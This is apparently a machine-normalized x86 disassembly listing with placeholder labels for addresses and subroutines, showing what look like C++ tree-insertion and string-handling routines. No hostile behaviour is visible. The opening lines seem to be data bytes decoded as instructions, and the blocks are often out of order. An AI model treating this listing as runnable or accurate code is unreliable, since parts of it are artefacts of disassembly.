jae r-xdata
add esp 0xffffffdc
push ebx
push esi
call sub_4d36b1
mov ebx edx
mov esi eax
add [ eax ] al
add [ eax ] al
cmp al 0x53
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
insd
cmp bh [ edx ]
push ebp
outsb
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
add [ ebp - 0x75 ] dl
in al dx
outsb
sub al 0x73
je r-xdata
mov ebp esp
cmp bh [ edx ]
popad
insb
insb
outsd
arpl [ ecx + 0x74 ] sp
sub_406ae0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
add ebx 0xc
cmp esi ebx
jne r-xdata
dec [ ebp - 0xc ]
mov edx 0x2
mov [ ebp - 0x18 ] 0x24
dec [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax 0x8
call sub_4d318c
dec [ ebp - 0xc ]
mov edx 0x2
mov eax [ ebp - 0x4 ]
add eax 0x4
call sub_4d318c
dec [ ebp - 0xc ]
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4d318c
mov [ ebp - 0x18 ] 0xc
sub_406b64
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
mov esi edx
mov [ ebp - 0xc ] esi
mov edx [ ebp + 0x18 ]
cmp esi edx
sete cl
and ecx 0x1
test cl cl
je r-xdata
mov esi [ ebp + 0x18 ]
mov eax [ ebp + 0x28 ]
cmp esi eax
setne dl
and edx 0x1
test dl dl
jne r-xdata
mov edx eax
mov esi edx
mov [ ebp - 0x1c ] esi
mov edx [ ebp + 0x28 ]
cmp esi edx
sete cl
and ecx 0x1
test cl cl
je r-xdata
mov edx [ ebp + 0x10 ]
add esp 0xfffffff0
mov [ ebp - 0x44 ] edx
lea ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] esi
push ecx
call sub_408004
pop ecx
mov eax [ ebp - 0x44 ]
mov [ esp ] eax
lea ecx [ ebp - 0x34 ]
mov eax [ ebp - 0x40 ]
mov [ esp + 0x4 ] eax
mov edx [ ebp - 0x3c ]
mov [ esp + 0x8 ] edx
push ebx
push ecx
call sub_406ce8
add esp 0x18
mov ecx [ ebp + 0x10 ]
mov [ edi ] ecx
mov ecx [ ebp + 0x14 ]
mov [ edi + 0x4 ] ecx
mov eax [ ebp + 0x18 ]
mov [ edi + 0x8 ] eax
mov eax edi
mov eax [ eax + 0x4 ]
push eax
push ebx
call sub_406c60
add esp 0x8
mov eax [ ebx + 0x28 ]
mov [ eax + 0x4 ] eax
xor edx edx
mov [ ebx + 0x2c ] edx
mov eax [ ebx + 0x28 ]
mov [ eax ] eax
mov [ eax + 0x8 ] eax
mov edx edi
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_406c60
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
mov ebx esi
jmp r-xdata
mov al [ ebx + 0x15 ]
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
push edi
call sub_406c60
mov ebx [ ebx ]
mov eax esi
mov [ ebp - 0x4 ] eax
add esp 0x8
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
push eax
call sub_4b0180
pop ecx
mov esi ebx
dec [ ebp - 0xc ]
mov [ ebp - 0x18 ] 0x24
dec [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
add ecx 0xc
mov [ ebp - 0x2c ] ecx
dec [ ebp - 0xc ]
mov edx 0x2
mov eax [ ebp - 0x2c ]
call sub_4d318c
mov [ ebp - 0x18 ] 0xc
sub_406ce8
push ebp
mov ebp esp
add esp 0xfffffde4
mov eax rw-data
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
call sub_4c517c
mov edx [ ebp + 0x18 ]
mov cl [ edx + 0x15 ]
test cl cl
je r-xdata
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x1f4 ] edx
lea ecx [ ebp + 0x10 ]
push ecx
call sub_408004
pop ecx
mov eax [ ebp - 0x1f4 ]
mov edx [ eax ]
mov cl [ edx + 0x15 ]
test cl cl
je r-xdata
lea eax [ ebp - 0x80 ]
lea edx [ ebp - 0x88 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
mov [ ebp - 0x70 ] 0x18
push edx
call sub_408628
pop ecx
lea ecx [ ebp - 0x88 ]
push ecx
lea eax [ ebp - 0x50 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x89 ] 0x0
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
mov edx [ eax + 0x8 ]
mov cl [ edx + 0x15 ]
test cl cl
je r-xdata
mov edi [ eax + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edi [ eax + 0x8 ]
mov edi [ eax ]
jmp r-xdata
mov edx [ ebp - 0x1f4 ]
cmp eax edx
jne r-xdata
xor edx edx
jmp r-xdata
mov edx rw-data
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
xor edx edx
mov [ ebp - 0x38 ] edx
add eax edx
mov [ ebp - 0x90 ] eax
mov eax [ ebp - 0x90 ]
mov cl [ ebp - 0x89 ]
mov [ eax ] cl
push rw-data
call sub_4c4e7c
pop ecx
mov ebx eax
mov eax rw-data
test eax eax
je r-xdata
mov ecx [ ebp - 0x1f4 ]
mov edx [ ecx ]
mov [ edx + 0x4 ] eax
mov ecx [ ebp - 0x1f4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ebp - 0x1f4 ]
mov edx [ ecx + 0x8 ]
cmp eax edx
jne r-xdata
mov eax [ ebp - 0x1f4 ]
mov ebx [ eax + 0x4 ]
mov al [ edi + 0x15 ]
test al al
jne r-xdata
test dl dl
je r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov ebx [ eax + 0x4 ]
mov dl [ edi + 0x15 ]
test dl dl
jne r-xdata
mov ebx eax
jmp r-xdata
mov edx [ esi + 0x28 ]
mov ecx [ edx + 0x4 ]
mov eax [ ebp - 0x1f4 ]
cmp ecx eax
jne r-xdata
mov [ edi + 0x4 ] ebx
lea edx [ ebp - 0x50 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x11c ] eax
mov ecx [ ebp - 0x11c ]
cmp ecx 0x1
ja r-xdata
mov eax rw-data
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
mov edx [ ebp - 0x34 ]
cmp edx 0x10
jb r-xdata
cmp edx eax
jb r-xdata
mov [ ebx ] edi
mov ecx [ ebp - 0x1f4 ]
mov edx [ ecx + 0x8 ]
mov [ eax + 0x8 ] edx
mov ecx [ ebp - 0x1f4 ]
mov edx [ ecx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] ebx
mov ecx [ esi + 0x28 ]
mov edx [ ecx + 0x4 ]
mov ecx [ ebp - 0x1f4 ]
cmp edx ecx
jne r-xdata
mov ecx [ ebx ]
mov eax [ ebp - 0x1f4 ]
cmp ecx eax
jne r-xdata
mov edx [ esi + 0x28 ]
mov [ edx + 0x4 ] edi
jmp r-xdata
mov eax [ ebp - 0x11c ]
dec eax
mov eax 0x1
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
lea ecx [ ebp - 0x48 ]
mov ecx [ ebp - 0x48 ]
jmp r-xdata
mov ecx [ ebp - 0x1f4 ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx ]
mov edx [ ebp - 0x1f4 ]
cmp ecx edx
jne r-xdata
mov edx [ esi + 0x28 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ ebx + 0x8 ] edi
mov [ ebx ] edi
jmp r-xdata
mov edx [ esi + 0x28 ]
mov ecx [ edx ]
mov eax [ ebp - 0x1f4 ]
cmp ecx eax
jne r-xdata
mov ecx [ ebp - 0x34 ]
cmp ebx ecx
jbe r-xdata
lea edx [ ebp - 0x58 ]
push edx
call sub_4bbca8
pop ecx
cmp ebx eax
jbe r-xdata
mov edx [ ebp - 0x38 ]
mov ecx [ ebp - 0x94 ]
sub edx ecx
mov [ ebp - 0x98 ] edx
mov eax [ ebp - 0x98 ]
cmp ebx eax
jae r-xdata
lea eax [ ebp - 0x58 ]
push eax
call sub_4bc8cc
pop ecx
sub eax edx
mov [ ebp - 0x94 ] eax
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x94 ]
cmp eax ecx
jae r-xdata
mov dl 0x1
mov eax [ ebp - 0x38 ]
add ecx eax
cmp ecx rw-data
ja r-xdata
mov ecx [ ebp - 0x1f4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp - 0x1f4 ]
mov edx [ ecx + 0x4 ]
mov [ edx ] eax
jmp r-xdata
mov ecx [ ebp - 0x1f4 ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
add eax 0x14
mov ecx [ ebp - 0x1f4 ]
add ecx 0x14
mov [ ebp - 0x1f8 ] ecx
mov [ ebp - 0x1fc ] eax
mov eax [ ebp - 0x1fc ]
mov edx [ ebp - 0x1f8 ]
cmp eax edx
je r-xdata
mov edx [ esi + 0x28 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp - 0x1f4 ]
cmp eax edx
jne r-xdata
mov dl [ edi + 0x15 ]
test dl dl
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ ebp - 0x58 ]
push eax
push ebx
push edx
call sub_408678
add esp 0xc
jmp r-xdata
lea edx [ ebp - 0x58 ]
lea ecx [ ebp - 0x58 ]
cmp edx ecx
jne r-xdata
mov [ ebp - 0x98 ] ebx
mov eax [ ebp - 0x1f4 ]
movsx edx [ eax + 0x14 ]
dec edx
jne r-xdata
mov ecx [ ebp - 0x1fc ]
mov al [ ecx ]
mov [ ebp - 0x1fd ] al
mov edx [ ebp - 0x1f8 ]
mov eax [ ebp - 0x1fc ]
mov cl [ edx ]
mov [ eax ] cl
mov edx [ ebp - 0x1f8 ]
mov cl [ ebp - 0x1fd ]
mov [ edx ] cl
mov cl [ edi + 0x15 ]
test cl cl
je r-xdata
push edi
call sub_4088dc
pop ecx
mov ecx eax
mov ecx ebx
jmp r-xdata
test ebx ebx
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x135 ] 0x0
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
mov edi [ ebp - 0x98 ]
lea eax [ ebp - 0x50 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0xe0 ] eax
mov edx [ ebp - 0xe0 ]
cmp edx 0x1
ja r-xdata
mov [ ebp - 0x9c ] 0xffffffff
mov eax [ ebp - 0x94 ]
mov edx [ ebp - 0x98 ]
add eax edx
mov [ ebp - 0xa0 ] eax
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0xa0 ]
cmp ecx eax
jae r-xdata
mov eax [ ebp - 0x1f4 ]
mov [ ebp - 0x214 ] eax
mov edx [ ebp - 0x214 ]
mov [ ebp - 0x5c ] edx
mov ecx [ ebp - 0x5c ]
test ecx ecx
je r-xdata
jmp r-xdata
push edi
call sub_4088f4
pop ecx
mov eax ebx
jmp r-xdata
mov eax [ esi + 0x28 ]
mov [ eax ] ecx
lea eax [ ebp - 0x58 ]
mov edx [ ebp - 0x34 ]
cmp edx 0x10
jb r-xdata
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
mov ecx [ ebp - 0xe0 ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0xa0 ]
sub ecx eax
mov edx [ ebp - 0x9c ]
cmp ecx edx
jae r-xdata
lea edx [ ebp - 0x58 ]
push edx
call sub_4bc8cc
pop ecx
mov edx [ ebp - 0x1f4 ]
mov [ ebp - 0x21c ] edx
mov ecx [ ebp - 0x21c ]
push ecx
call sub_4b0180
pop ecx
mov eax [ esi + 0x2c ]
test eax eax
jbe r-xdata
dec [ ebp - 0x64 ]
mov [ ebp - 0x70 ] 0x54
dec [ ebp - 0x64 ]
mov eax [ ebp - 0x5c ]
add eax 0xc
mov [ ebp - 0x218 ] eax
dec [ ebp - 0x64 ]
mov edx 0x2
mov eax [ ebp - 0x218 ]
call sub_4d318c
mov [ ebp - 0x70 ] 0x3c
mov eax [ esi + 0x28 ]
mov edx [ eax + 0x4 ]
cmp edi edx
je r-xdata
mov edx [ esi + 0x28 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea ecx [ ebp - 0x48 ]
mov ecx [ ebp - 0x48 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
add edx eax
mov [ ebp - 0x13c ] edx
mov edx [ ebp - 0x13c ]
mov cl [ ebp - 0x135 ]
mov [ edx ] cl
mov edx [ ebp - 0x34 ]
cmp edi edx
jbe r-xdata
lea eax [ ebp - 0x58 ]
push eax
call sub_4bbca8
pop ecx
cmp edi ecx
jbe r-xdata
mov edx [ ebp - 0x9c ]
test edx edx
jbe r-xdata
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0xa0 ]
sub ecx eax
mov [ ebp - 0x9c ] ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov [ edx ] ecx
mov ecx [ ebp + 0x14 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x18 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x80 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec [ esi + 0x2c ]
mov [ edi + 0x14 ] 0x1
movsx ecx [ edi + 0x14 ]
dec ecx
je r-xdata
mov ecx [ ebp - 0x38 ]
mov [ ebp - 0x15c ] ecx
mov eax [ ebp - 0x15c ]
cmp eax 0xffffffff
jbe r-xdata
lea edx [ ebp - 0x28 ]
push edx
call sub_4bc8cc
pop ecx
xor edx edx
mov [ ebp - 0x8 ] edx
add eax edx
mov [ ebp - 0x158 ] eax
mov eax [ ebp - 0x158 ]
mov cl [ ebp - 0x151 ]
mov [ eax ] cl
mov eax [ ebp - 0x38 ]
test eax eax
jae r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov [ ebp - 0x140 ] ecx
push ebx
push rw-data
mov eax [ ebp - 0x140 ]
push eax
call sub_4c4cb0
mov [ ebp - 0x141 ] 0x0
mov edx [ ebp - 0x34 ]
add esp 0xc
cmp edx 0x10
jb r-xdata
test edi edi
jne r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ ebp - 0x58 ]
push eax
push edi
push edx
call sub_408678
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x94 ]
mov [ ebp - 0xc0 ] eax
mov edx [ ebp - 0x38 ]
test edx edx
jae r-xdata
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0xa0 ]
sub ecx eax
mov edx [ ebp - 0x9c ]
sub ecx edx
mov [ ebp - 0xa4 ] ecx
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
mov ecx [ ebx ]
cmp edi ecx
jne r-xdata
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x58 ]
cmp edx ecx
jne r-xdata
mov [ ebp - 0x15c ] 0xffffffff
mov [ ebp - 0x38 ] ebx
add eax ebx
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x148 ]
mov dl [ ebp - 0x141 ]
mov [ eax ] dl
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xf9 ] 0x0
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp - 0x38 ]
mov edx [ ebp - 0xc0 ]
cmp eax edx
jae r-xdata
lea ecx [ ebp - 0x58 ]
push ecx
call sub_4bc8cc
pop ecx
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebx ]
mov dl [ eax + 0x14 ]
test dl dl
jne r-xdata
mov eax [ ebx + 0x8 ]
mov dl [ eax + 0x14 ]
test dl dl
jne r-xdata
mov eax [ ebp - 0x15c ]
mov [ ebp - 0x1a4 ] eax
lea edx [ ebp - 0x20 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x1a8 ] eax
mov ecx [ ebp - 0x1a8 ]
cmp ecx 0x1
ja r-xdata
mov [ ebp - 0x160 ] 0xffffffff
mov eax [ ebp - 0x15c ]
mov [ ebp - 0x164 ] eax
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x164 ]
cmp edx ecx
jae r-xdata
lea eax [ ebp - 0x58 ]
jmp r-xdata
mov edx [ ebp - 0x98 ]
mov [ ebp - 0x104 ] edx
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0xc0 ]
test eax eax
jbe r-xdata
mov ecx [ ebp - 0x38 ]
mov [ ebp - 0xc0 ] ecx
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
mov edx [ ebp - 0xa0 ]
add eax edx
mov ecx [ ebp - 0x9c ]
add eax ecx
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov [ eax + 0x14 ] 0x1
mov eax ebx
mov [ ebx + 0x14 ] 0x0
mov edx [ eax ]
mov [ ebp - 0x20c ] edx
mov ecx [ ebp - 0x20c ]
mov edx [ ecx + 0x8 ]
mov [ eax ] edx
mov ecx [ ebp - 0x20c ]
mov edx [ ecx + 0x8 ]
mov cl [ edx + 0x15 ]
test cl cl
jne r-xdata
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov [ eax + 0x14 ] 0x1
mov eax ebx
mov [ ebx + 0x14 ] 0x0
mov edx [ eax + 0x8 ]
mov [ ebp - 0x204 ] edx
mov ecx [ ebp - 0x204 ]
mov edx [ ecx ]
mov [ eax + 0x8 ] edx
mov ecx [ ebp - 0x204 ]
mov edx [ ecx ]
mov cl [ edx + 0x15 ]
test cl cl
jne r-xdata
mov eax [ ebp - 0x1a8 ]
dec eax
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x164 ]
sub edx ecx
mov eax [ ebp - 0x160 ]
cmp edx eax
jae r-xdata
lea eax [ ebp - 0x28 ]
push eax
call sub_4bc8cc
pop ecx
inc [ ebp - 0x64 ]
lea edx [ ebp - 0x30 ]
push edx
call sub_4088ac
pop ecx
inc [ ebp - 0x64 ]
mov ecx rw-data
mov [ ebp - 0x30 ] ecx
lea eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x150 ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0x150 ]
push ecx
lea eax [ ebp - 0x20 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x151 ] 0x0
mov ecx [ ebp - 0x4 ]
cmp ecx 0x10
jb r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
add edx eax
mov [ ebp - 0x100 ] edx
mov edx [ ebp - 0x100 ]
mov cl [ ebp - 0xf9 ]
mov [ edx ] cl
mov edx [ ebp - 0x38 ]
mov ecx [ ebp - 0xc0 ]
sub edx ecx
mov [ ebp - 0xc4 ] edx
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0xa0 ]
add edx eax
mov [ ebp - 0xac ] edx
mov ecx [ ebp - 0xa4 ]
push ecx
mov eax [ ebp - 0xa8 ]
push eax
mov edx [ ebp - 0xac ]
push edx
call sub_4c4cf8
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x9c ]
sub ecx eax
add esp 0xc
mov [ ebp - 0xb0 ] ecx
mov edx [ ebp - 0xb0 ]
mov [ ebp - 0xb4 ] edx
mov [ ebp - 0xb5 ] 0x0
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
mov edx [ eax + 0x8 ]
movsx ecx [ edx + 0x14 ]
dec ecx
jne r-xdata
mov edi ebx
jmp r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x20c ]
mov [ ecx + 0x4 ] edx
mov edx [ esi + 0x28 ]
mov ecx [ edx + 0x4 ]
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x20c ]
mov ecx [ edx + 0x8 ]
mov [ ecx + 0x4 ] eax
mov edx [ eax ]
movsx ecx [ edx + 0x14 ]
dec ecx
jne r-xdata
mov edi ebx
jmp r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x204 ]
mov [ ecx + 0x4 ] edx
mov edx [ esi + 0x28 ]
mov ecx [ edx + 0x4 ]
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x204 ]
mov ecx [ edx ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1a4 ]
cmp eax edx
jae r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
call sub_4bbca8
pop ecx
mov edx [ ebp - 0x1a4 ]
cmp eax edx
jae r-xdata
mov eax [ ebp - 0x160 ]
test eax eax
jbe r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x164 ]
sub edx ecx
mov [ ebp - 0x160 ] edx
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov edx [ ebp - 0x94 ]
add eax edx
mov [ ebp - 0x108 ] eax
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
mov edx [ ebp - 0xb4 ]
mov [ ebp - 0x38 ] edx
add eax edx
mov [ ebp - 0xbc ] eax
mov eax [ ebp - 0xbc ]
mov cl [ ebp - 0xb5 ]
mov [ eax ] cl
mov edx [ eax ]
movsx ecx [ edx + 0x14 ]
dec ecx
jne r-xdata
mov edx [ eax ]
movsx ecx [ edx + 0x14 ]
dec ecx
jne r-xdata
mov ebx [ edi + 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx [ esi + 0x28 ]
mov ecx [ ebp - 0x20c ]
mov [ edx + 0x4 ] ecx
jmp r-xdata
mov edx [ eax + 0x8 ]
movsx ecx [ edx + 0x14 ]
dec ecx
jne r-xdata
mov edx [ eax + 0x8 ]
movsx ecx [ edx + 0x14 ]
dec ecx
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ edx ]
cmp eax ecx
jne r-xdata
mov edx [ esi + 0x28 ]
mov ecx [ ebp - 0x204 ]
mov [ edx + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x1a4 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov eax [ ebp - 0x1a4 ]
push eax
lea edx [ ebp - 0x28 ]
push edx
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x184 ] eax
mov edx [ ebp - 0x8 ]
test edx edx
jae r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x164 ]
sub edx ecx
mov eax [ ebp - 0x160 ]
sub edx eax
mov [ ebp - 0x168 ] edx
mov edx [ ebp - 0x4 ]
cmp edx 0x10
jb r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov [ ebp - 0x10c ] eax
mov edx [ ebp - 0x104 ]
push edx
mov ecx [ ebp - 0x108 ]
push ecx
mov eax [ ebp - 0x10c ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x98 ]
mov [ ebp - 0x110 ] edx
mov [ ebp - 0x111 ] 0x0
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0xc0 ]
add edx eax
mov [ ebp - 0xc8 ] edx
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
mov cl [ ebx + 0x14 ]
mov [ eax + 0x14 ] cl
mov [ ebx + 0x14 ] 0x1
mov eax [ eax ]
mov [ eax + 0x14 ] 0x1
mov eax ebx
mov edx [ eax ]
mov ecx [ edx + 0x8 ]
mov [ eax ] ecx
mov ecx [ edx + 0x8 ]
mov cl [ ecx + 0x15 ]
test cl cl
jne r-xdata
mov edx [ eax + 0x8 ]
mov [ edx + 0x14 ] 0x1
mov [ eax + 0x14 ] 0x0
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x210 ] ecx
mov edx [ ebp - 0x210 ]
mov ecx [ edx ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp - 0x210 ]
mov ecx [ edx ]
mov dl [ ecx + 0x15 ]
test dl dl
jne r-xdata
mov [ eax + 0x14 ] 0x0
mov edi ebx
jmp r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x20c ]
mov [ edx ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x20c ]
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov edx [ ebp - 0x20c ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp - 0x20c ]
mov [ eax + 0x4 ] ecx
mov eax [ ebx ]
mov cl [ ebx + 0x14 ]
mov [ eax + 0x14 ] cl
mov [ ebx + 0x14 ] 0x1
mov eax [ eax + 0x8 ]
mov [ eax + 0x14 ] 0x1
mov eax ebx
mov edx [ eax + 0x8 ]
mov ecx [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx ]
mov cl [ ecx + 0x15 ]
test cl cl
jne r-xdata
mov edx [ eax ]
mov [ edx + 0x14 ] 0x1
mov [ eax + 0x14 ] 0x0
mov ecx [ eax ]
mov [ ebp - 0x208 ] ecx
mov edx [ ebp - 0x208 ]
mov ecx [ edx + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp - 0x208 ]
mov ecx [ edx + 0x8 ]
mov dl [ ecx + 0x15 ]
test dl dl
jne r-xdata
mov [ eax + 0x14 ] 0x0
mov edi ebx
jmp r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x204 ]
mov [ edx + 0x8 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x204 ]
mov [ edx ] ecx
jmp r-xdata
mov edx [ ebp - 0x204 ]
mov [ edx ] eax
mov ecx [ ebp - 0x204 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebx + 0x8 ]
mov eax [ ebp - 0x1a4 ]
test eax eax
seta dl
and edx 0x1
test dl dl
je r-xdata
mov [ ebp - 0x1c1 ] 0x0
mov edx [ ebp - 0x4 ]
cmp edx 0x10
jb r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x184 ]
cmp eax edx
jae r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
call sub_4bc8cc
pop ecx
lea ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov edx [ ebp - 0x110 ]
mov [ ebp - 0x38 ] edx
add eax edx
mov [ ebp - 0x118 ] eax
mov eax [ ebp - 0x118 ]
mov cl [ ebp - 0x111 ]
mov [ eax ] cl
lea ecx [ ebp - 0x48 ]
mov ecx [ ebp - 0x48 ]
jmp r-xdata
mov [ ebp - 0xcc ] eax
mov edx [ ebp - 0xc4 ]
push edx
mov ecx [ ebp - 0xc8 ]
push ecx
mov eax [ ebp - 0xcc ]
push eax
call sub_4c4cf8
mov edx [ ebp - 0x38 ]
mov ecx [ ebp - 0xc0 ]
sub edx ecx
add esp 0xc
mov [ ebp - 0xd0 ] edx
mov eax [ ebp - 0xd0 ]
mov [ ebp - 0xd4 ] eax
mov [ ebp - 0xd5 ] 0x0
mov edx [ ebp - 0x34 ]
cmp edx 0x10
jb r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ esi + 0x28 ]
mov ecx [ ecx + 0x4 ]
cmp eax ecx
jne r-xdata
mov ecx [ edx + 0x8 ]
